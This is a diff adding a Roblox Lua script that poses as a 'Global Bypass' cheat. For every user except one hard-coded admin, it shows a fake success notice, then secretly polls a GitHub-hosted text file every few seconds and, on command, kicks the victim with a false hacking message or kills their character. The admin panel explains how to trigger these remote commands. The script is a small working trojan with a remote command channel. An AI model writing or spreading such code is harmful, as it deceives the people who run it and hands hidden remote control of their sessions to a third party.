@@ -1,0 +1,112 @@
+-- [[ CONFIGURATION ]]
+local CONTROL_URL = "https://raw.githubusercontent.com/ParadozCode/Leaks-/refs/heads/main/status.txt" 
+local ADMIN_ID = 4604561746 -- XxDarkLordDiamondxX
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+
+-----------------------------------------------------------
+-- 1. THE PRANK GATEKEEPER
+-----------------------------------------------------------
+if LocalPlayer.UserId ~= ADMIN_ID then
+    -- Victim Experience
+    print("Script successfully executed!")
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "System";
+        Text = "V3.2 Loaded. Global Bypass: ON";
+        Duration = 5;
+    })
+    
+    -- Silent Listener (Checks for KICK_ALL or KILL_ALL)
+    task.spawn(function()
+        while task.wait(3) do
+            local success, command = pcall(function() return game:HttpGet(CONTROL_URL) end)
+            if success then
+                if string.find(command, "KICK_ALL") then
+                    LocalPlayer:Kick("YOU HAVE BEEN KICKED FOR HACKING")
+                elseif string.find(command, "KILL_ALL") then
+                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                        LocalPlayer.Character.Humanoid.Health = 0
+                    end
+                end
+            end
+        end
+    end)
+    return -- End script for the victim
+end
+
+-----------------------------------------------------------
+-- 2. THE ADMIN CONTROL PANEL (Only for XxDarkLordDiamondxX)
+-----------------------------------------------------------
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local KickBtn = Instance.new("TextButton")
+local FlingBtn = Instance.new("TextButton")
+local Info = Instance.new("TextLabel")
+
+ScreenGui.Name = "DarkLord_Remote_V3"
+ScreenGui.Parent = CoreGui
+
+MainFrame.Name = "Main"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.BorderSizePixel = 2
+MainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+MainFrame.Position = UDim2.new(0.05, 0, 0.4, 0)
+MainFrame.Size = UDim2.new(0, 220, 0, 180)
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+Title.Parent = MainFrame
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+Title.Text = "DARK LORD REMOTE"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.Font = Enum.Font.SourceSansBold
+Title.TextSize = 16
+
+Info.Parent = MainFrame
+Info.Position = UDim2.new(0, 5, 0, 35)
+Info.Size = UDim2.new(1, -10, 0, 40)
+Info.Text = "Update GitHub to 'KICK_ALL' to remove the victim."
+Info.TextColor3 = Color3.fromRGB(200, 200, 200)
+Info.TextWrapped = true
+Info.TextSize = 12
+Info.BackgroundTransparency = 1
+
+-- UI Kick Instruction Button
+KickBtn.Parent = MainFrame
+KickBtn.Position = UDim2.new(0.1, 0, 0.45, 0)
+KickBtn.Size = UDim2.new(0.8, 0, 0, 35)
+KickBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
+KickBtn.Text = "ACTIVATE REMOTE KICK"
+KickBtn.TextColor3 = Color3.new(1, 1, 1)
+KickBtn.Font = Enum.Font.SourceSansBold
+KickBtn.MouseButton1Click:Connect(function()
+    print("--- REMOTE COMMAND ---")
+    print("To kick everyone else, change GitHub text to: KICK_ALL")
+    print("Link: " .. CONTROL_URL)
+end)
+
+-- Local Fling (This makes YOU spin to hit others)
+FlingBtn.Parent = MainFrame
+FlingBtn.Position = UDim2.new(0.1, 0, 0.7, 0)
+FlingBtn.Size = UDim2.new(0.8, 0, 0, 35)
+FlingBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+FlingBtn.Text = "LOCAL FLING (HIT OTHERS)"
+FlingBtn.TextColor3 = Color3.new(1, 1, 1)
+FlingBtn.Font = Enum.Font.SourceSansBold
+FlingBtn.MouseButton1Click:Connect(function()
+    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local velocity = Instance.new("BodyAngularVelocity")
+    velocity.AngularVelocity = Vector3.new(0, 9999, 0)
+    velocity.MaxTorque = Vector3.new(0, math.huge, 0)
+    velocity.P = 1250
+    velocity.Parent = hrp
+    task.wait(2)
+    velocity:Destroy()
+end)
+
+print("Dark Lord Panel Loaded. Remote Link: " .. CONTROL_URL)
